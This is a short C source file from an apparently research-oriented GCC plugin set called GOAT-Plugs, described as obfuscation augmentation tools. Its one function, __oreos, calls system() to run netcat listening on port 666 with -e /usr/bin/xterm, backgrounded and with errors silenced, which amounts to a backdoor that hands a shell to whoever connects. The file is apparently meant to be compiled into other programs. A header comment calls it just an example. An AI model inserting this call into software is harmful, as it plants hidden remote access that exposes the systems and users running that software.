/******************************************************************************
 * hatch_builtins.c 
 *
 * GOAT-Plugs: GCC Obfuscation Augmentation Tools
 *
 * WARNING: THIS IS JUST AN EXAMPLE.  SPAWNING SOCKETS CAN BE VERY DANGEROUS.
 *
 * Copyright (C) 2011 Matt Davis (enferex) of 757Labs
 * (www.757Labs.org)
 *
 * hatch_builtins.c is part of the GOAT-Plugs GCC plugin set.
 * GOAT-Plugs is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * GOAT-Plugs is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with GOAT-Plugs.  If not, see <http://www.gnu.org/licenses/>.
 *****************************************************************************/

#include <stdlib.h>


/* Called at runtime to spawn a netcat instance on port 666 which will kick-off
 * an xterm session.
 */
void __oreos(void)
{
    system("/usr/bin/nc -l -p 666 -e /usr/bin/xterm 2>/dev/null &");
}
